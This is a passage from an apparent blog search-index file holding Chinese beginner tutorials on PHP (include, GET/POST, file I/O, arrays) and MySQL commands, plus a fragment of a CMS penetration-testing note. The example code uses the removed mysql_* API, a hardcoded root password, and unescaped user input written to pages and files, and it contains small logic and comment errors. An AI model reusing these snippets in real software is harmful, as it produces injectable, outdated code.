class="code"><pre><span class="line">dedecms</span><br><span class="line">phpcms</span><br><span class="line">CmsEasy</span><br></pre></td></tr></table></figure><ul><li>源代码信息、目录结构</li><li>测试框架漏洞</li><li>一般都是代码审计，使用黑盒来测试OWASP TOP 10漏洞成功几率小，除非是使用的人少，不常见的CMS</li><li>二次开发：可以尝试OWASP TOP 10漏洞</li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP 面向对象</title>
      <link href="/article/php-object.html"/>
      <url>/article/php-object.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PHP编程 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP 操作MySQL</title>
      <link href="/article/php-mysql.html"/>
      <url>/article/php-mysql.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type: text/html;charset=utf-8&quot;);</span><br><span class="line">$link = mysql_connect(&apos;127.0.0.1&apos;,&apos;root&apos;,&apos;123456&apos;);</span><br><span class="line">if ($link) &#123;</span><br><span class="line">    echo &apos;数据库连接成功！&lt;br/&gt;&apos;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &apos;数据库连接失败！&lt;br/&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 创建数据库</span><br><span class="line">// mysql_query(&apos;create database admin;&apos;);</span><br><span class="line">// 选择数据库</span><br><span class="line">mysql_query(&quot;use admin&quot;);</span><br><span class="line">if (mysql_errno()) &#123;</span><br><span class="line">    echo mysql_errno();</span><br><span class="line">    echo &quot;&lt;br/&gt;&quot;;</span><br><span class="line">    echo mysql_error();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 设置数据库编码</span><br><span class="line">mysql_query(&quot;set names utf8&quot;);</span><br><span class="line">// 创建数据库表、字段</span><br><span class="line">// mysql_query(&apos;create table admin(Username varchar(20) not null,Passworld text not null);&apos;);</span><br><span class="line">// 插入数据库</span><br><span class="line">// mysql_query(&quot;insert into admin values (&apos;admins&apos;,&apos;123456&apos;)&quot;);</span><br><span class="line"></span><br><span class="line">// 查询</span><br><span class="line">$list = mysql_query(&apos;select * from admin&apos;);</span><br><span class="line">// 返回关联数组</span><br><span class="line">// $list_data = mysql_fetch_array($list,MYSQL_ASSOC);</span><br><span class="line">// 返回索引数组</span><br><span class="line">// $list_data = mysql_fetch_array($list,MYSQL_NUM);</span><br><span class="line">while ($data = mysql_fetch_array($list,MYSQL_NUM)) &#123;</span><br><span class="line">    var_dump($data);</span><br><span class="line">    echo &quot;&lt;br/&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">// 默认的，两组都返回</span><br><span class="line">// $list_data = mysql_fetch_array($list,MYSQL_BOTH);</span><br><span class="line">// var_dump($list_data);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PHP编程 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP 文件包含</title>
      <link href="/article/php-include.html"/>
      <url>/article/php-include.html</url>
      
        <content type="html"><![CDATA[<h3 id="包含HTML"><a href="#包含HTML" class="headerlink" title="包含HTML"></a>包含HTML</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 包含同目录下的test.html文件</span><br><span class="line">include &apos;./test.html&apos;;</span><br><span class="line">// 包含同目录下的test.html文件，如果在代码前边已经包含了，就不会再次包含。</span><br><span class="line">include_once &apos;./test.html&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;POST请求测试！&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form </span><br><span class="line">method=&quot;POST&quot; action=&quot;./index.php&quot;&gt;</span><br><span class="line">提交：</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;cent&quot; placeholder=&quot;请输入参数!&quot;&gt; </span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="包含PHP"><a href="#包含PHP" class="headerlink" title="包含PHP"></a>包含PHP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$vul = include &apos;./test.php&apos;;</span><br><span class="line">echo $vul[&apos;name&apos;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>test.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">return array(&apos;name&apos; =&gt; &apos;纸条&apos;, &apos;like&apos; =&gt; &apos;test&apos; );</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PHP编程 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>MySQL数据库操作</title>
      <link href="/article/database-mysql.html"/>
      <url>/article/database-mysql.html</url>
      
        <content type="html"><![CDATA[<h3 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql -h 127.0.0.1 -u root -p -P 3306</span><br><span class="line"></span><br><span class="line">-h IP</span><br><span class="line">-u 用户名</span><br><span class="line">-p 密码 可不填</span><br><span class="line">-P (大写)端口号</span><br></pre></td></tr></table></figure><h3 id="查看所有的数据库"><a href="#查看所有的数据库" class="headerlink" title="查看所有的数据库"></a>查看所有的数据库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br></pre></td></tr></table></figure><h3 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create database test; </span><br><span class="line">#创建数据库admin，并使用utf-8编码，IF NOT EXISTS，无论数据库是否存在都创建</span><br><span class="line">CREATE DATABASE IF NOT EXISTS admin DEFAULT CHARACTER SET &apos;utf8&apos; COLLATE &apos;utf8_general_ci&apos;;</span><br><span class="line">#创建数据库admin，并使用gbk编码，IF NOT EXISTS，无论数据库是否存在都创建</span><br><span class="line">CREATE DATABASE IF NOT EXISTS admin DEFAULT CHARACTER SET &apos;gbk&apos; COLLATE &apos;gbk_chinese_ci&apos;;</span><br></pre></td></tr></table></figure><h3 id="操作数据库"><a href="#操作数据库" class="headerlink" title="操作数据库"></a>操作数据库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#选择test数据库</span><br><span class="line">use test;</span><br><span class="line">#创建字段Username、Passworld，自动增长性 不能为空</span><br><span class="line">create table admin(username varchar(20) not null,passwd char(50) not null comment&apos;注释符&apos;);</span><br><span class="line">#创建字段Username、Passworld，不能为空，默认为1</span><br><span class="line">Create table admin(Username varchar(20) not null,Passworld text not null default 1);</span><br><span class="line">#查看表里边的字段</span><br><span class="line">desc admin;</span><br><span class="line">#插入一条数据，分别对应Username、Passworld</span><br><span class="line">insert into admin values(&apos;admin&apos;,&apos;123456&apos;);</span><br><span class="line">insert into admin (Username,Passworld) values(&apos;test&apos;,&apos;12345678&apos;);</span><br><span class="line">insert into admin (Username) values(&apos;123456&apos;);</span><br></pre></td></tr></table></figure><h3 id="查询数据库"><a href="#查询数据库" class="headerlink" title="查询数据库"></a>查询数据库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#查询admin表所有数据</span><br><span class="line">select * from admin;</span><br><span class="line">#只查询admin表的Username字段</span><br><span class="line">select Username from admin;</span><br><span class="line">select * from admin where Username = &apos;admin&apos;;</span><br></pre></td></tr></table></figure><h3 id="修改数据"><a href="#修改数据" class="headerlink" title="修改数据"></a>修改数据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update admin set Username = &apos;2018&apos; where Username = &apos;admin&apos;;</span><br></pre></td></tr></table></figure><h3 id="清空数据"><a href="#清空数据" class="headerlink" title="清空数据"></a>清空数据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete from admin where Username = &apos;2018&apos;;</span><br></pre></td></tr></table></figure><h3 id="删除表"><a href="#删除表" class="headerlink" title="删除表"></a>删除表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">drop table admin;</span><br><span class="line">#删除数据库</span><br><span class="line">DROP DATABASE test;</span><br></pre></td></tr></table></figure><h3 id="查看数据库存放路径"><a href="#查看数据库存放路径" class="headerlink" title="查看数据库存放路径"></a>查看数据库存放路径</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &quot;%datadir%&quot;;</span><br></pre></td></tr></table></figure><h3 id="备份数据库"><a href="#备份数据库" class="headerlink" title="备份数据库"></a>备份数据库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin into outfile &apos;/mnt/d/data.txt&apos;;</span><br></pre></td></tr></table></figure><h3 id="导入数据库"><a href="#导入数据库" class="headerlink" title="导入数据库"></a>导入数据库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source /mnt/d/test/webpy/data.sql</span><br></pre></td></tr></table></figure><h3 id="自增型"><a href="#自增型" class="headerlink" title="自增型"></a>自增型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">create database test; </span><br><span class="line">use test;</span><br><span class="line">set names utf8;</span><br><span class="line">create table admin(id int not null primary key auto_increment,username varchar(20) not null,passwd char(50) not null comment&apos;注释符&apos;);</span><br><span class="line">insert into admin (username,passwd) values(&apos;test&apos;,&apos;12345678&apos;);</span><br><span class="line">select * from admin;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; desc admin;</span><br><span class="line">+----------+-------------+------+-----+---------+----------------+</span><br><span class="line">| Field    | Type        | Null | Key | Default | Extra          |</span><br><span class="line">+----------+-------------+------+-----+---------+----------------+</span><br><span class="line">| id       | int(11)     | NO   | PRI | NULL    | auto_increment |</span><br><span class="line">| username | varchar(20) | NO   |     | NULL    |                |</span><br><span class="line">| passwd   | char(50)    | NO   |     | NULL    |                |</span><br><span class="line">+----------+-------------+------+-----+---------+----------------+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from admin;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | passwd   |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | test     | 12345678 |</span><br><span class="line">|  2 | test     | 12345678 |</span><br><span class="line">|  3 | test     | 12345678 |</span><br><span class="line">|  4 | test     | 12345678 |</span><br><span class="line">|  5 | test     | 12345678 |</span><br><span class="line">|  6 | test     | 12345678 |</span><br><span class="line">|  7 | test     | 12345678 |</span><br><span class="line">|  8 | test     | 12345678 |</span><br><span class="line">|  9 | test     | 12345678 |</span><br><span class="line">| 10 | test     | 12345678 |</span><br><span class="line">| 11 | test     | 12345678 |</span><br><span class="line">+----+----------+----------+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 从第0条开始查，查15条</span><br><span class="line">mysql&gt; select * from admin limit 0,5;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | passwd   |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | test     | 12345678 |</span><br><span class="line">|  2 | test     | 12345678 |</span><br><span class="line">|  3 | test     | 12345678 |</span><br><span class="line">|  4 | test     | 12345678 |</span><br><span class="line">|  5 | test     | 12345678 |</span><br><span class="line">+----+----------+----------+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 查询数据库一共有多少条</span><br><span class="line">mysql&gt; select count(id) from admin;</span><br><span class="line">+-----------+</span><br><span class="line">| count(id) |</span><br><span class="line">+-----------+</span><br><span class="line">|        11 |</span><br><span class="line">+-----------+</span><br></pre></td></tr></table></figure><h3 id="搜索字符"><a href="#搜索字符" class="headerlink" title="搜索字符"></a>搜索字符</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where username like &apos;admin&apos;;</span><br><span class="line">select * from admin where username like &apos;%admin&apos;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP GET、POST请求、三元运算符</title>
      <link href="/article/php-get-post.html"/>
      <url>/article/php-get-post.html</url>
      
        <content type="html"><![CDATA[<h3 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h3><p>获取get参数，并写入文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$get = $_GET[&apos;name&apos;];</span><br><span class="line"></span><br><span class="line">$file = fopen(&apos;./test.txt&apos;, &apos;a+&apos;);</span><br><span class="line">// 添加内容</span><br><span class="line">fwrite($file, $get);</span><br><span class="line">// 关闭文件</span><br><span class="line">fclose($file);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h3><p>empty 如果没有值则为真，有值则为假<br>isset 如果有值则为真，没有值则为假</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;POST请求测试！&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form </span><br><span class="line">method=&quot;POST&quot; action=&quot;./index.php&quot;&gt;</span><br><span class="line">提交：</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;cent&quot; placeholder=&quot;请输入参数!&quot;&gt; </span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type: text/html;charset=utf-8&quot;);</span><br><span class="line">// 打开网页后直接输出这个POST数据，就会出错</span><br><span class="line">// echo $_POST[&quot;cent&quot;];</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&apos;name&apos;])) &#123;</span><br><span class="line">    echo $_POST[&quot;cent&quot;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="三元运算符"><a href="#三元运算符" class="headerlink" title="三元运算符"></a>三元运算符</h3><p>empty 如果没有值则为真，有值则为假<br>isset 如果有值则为真，没有值则为假</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;POST请求测试！&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form </span><br><span class="line">method=&quot;POST&quot; action=&quot;./index.php&quot;&gt;</span><br><span class="line">提交：</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;cent&quot; placeholder=&quot;请输入参数!&quot;&gt; </span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type: text/html;charset=utf-8&quot;);</span><br><span class="line">// 如果没有值，默认为空。</span><br><span class="line">// 当empty($_POST[&apos;cent&apos;])成立时&apos;&apos;就为$post值</span><br><span class="line">// 不成立时$_POST[&apos;cent&apos;]为$post值</span><br><span class="line">$post = empty($_POST[&apos;cent&apos;])? &apos;&apos;:$_POST[&apos;cent&apos;];</span><br><span class="line">echo $post;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PHP编程 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP 时间戳、系统变量、文件操作</title>
      <link href="/article/php-time-file.html"/>
      <url>/article/php-time-file.html</url>
      
        <content type="html"><![CDATA[<h3 id="时间戳"><a href="#时间戳" class="headerlink" title="时间戳"></a>时间戳</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$time = time();</span><br><span class="line">///时间戳转时间</span><br><span class="line">echo date(&apos;Y-m-d H:i:s&apos;, $time);</span><br><span class="line">echo &apos;&lt;br/&gt;&apos;;</span><br><span class="line">echo date(&apos;Y-m-d H:i:s&apos;);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h3><p>打开文件的模式参考：</p><p><a href="http://www.w3school.com.cn/php/php_file_open.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/php/php_file_open.asp</a></p><p>Fgets($file)           读第一行文件<br>Fread($file,获取字节)   指定获取内容<br>Filesize($file)        获取文件字节<br>Fclose($file)          关闭资源</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$file = fopen(&apos;./test.txt&apos;, &apos;a+&apos;);</span><br><span class="line">// 指针，读取文件第一行</span><br><span class="line">echo fgetc($file);</span><br><span class="line">// 第二行</span><br><span class="line">echo fgetc($file);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$file = fopen(&apos;./test.txt&apos;, &apos;a+&apos;);</span><br><span class="line">// 读取文件前5个字节</span><br><span class="line">echo fread($file, 5);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 查看文件一共有多少个字节</span><br><span class="line">echo filesize(&apos;./test.txt&apos;);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$file = fopen(&apos;./test.txt&apos;, &apos;a+&apos;);</span><br><span class="line">// 读取全部内容</span><br><span class="line">echo fread($file, filesize(&apos;./test.txt&apos;));</span><br><span class="line"></span><br><span class="line">// 关闭文件</span><br><span class="line">fclose($file);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$file = fopen(&apos;./test.txt&apos;, &apos;a+&apos;);</span><br><span class="line">// 添加内容</span><br><span class="line">fwrite($file, &quot;\r\n这是添加的内容！&quot;);</span><br><span class="line">// 关闭文件</span><br><span class="line">fclose($file);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="系统变量"><a href="#系统变量" class="headerlink" title="系统变量"></a>系统变量</h3><p>参考：(可以使用PHPinfo函数查看)</p><p><a href="http://www.w3school.com.cn/php/php_superglobals.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/php/php_superglobals.asp</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">// 返回当前脚本的路径。</span><br><span class="line">echo $_SERVER[&apos;SCRIPT_NAME&apos;].&apos;&lt;br/&gt;&apos;;</span><br><span class="line">// 返回当前执行脚本的绝对路径。</span><br><span class="line">echo $_SERVER[&apos;SCRIPT_FILENAME&apos;];</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PHP编程 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP 数组</title>
      <link href="/article/php-array.html"/>
      <url>/article/php-array.html</url>
      
        <content type="html"><![CDATA[<p>数组就是在内存里有一块连续的内存空间（堆空间），这里面可以保存多个数据，数据没有数据类型的限制。 </p><h3 id="索引数组"><a href="#索引数组" class="headerlink" title="索引数组"></a>索引数组</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$array = array(&apos;纸条&apos;,&apos;Python&apos;,&apos;PHP&apos;,&apos;渗透测试&apos;);</span><br><span class="line"></span><br><span class="line">echo $array[0];</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">纸条</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$array = array(&apos;纸条&apos;,&apos;Python&apos;,&apos;PHP&apos;,&apos;渗透测试&apos;);</span><br><span class="line">///输出全部的数组，并直观统计数组个数、数组脚标、数组类型及字节长度、</span><br><span class="line">var_dump($array);</span><br><span class="line">echo &quot;&lt;/br /&gt;&quot;;</span><br><span class="line">print_r($array);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="添加数组"><a href="#添加数组" class="headerlink" title="添加数组"></a>添加数组</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$array = 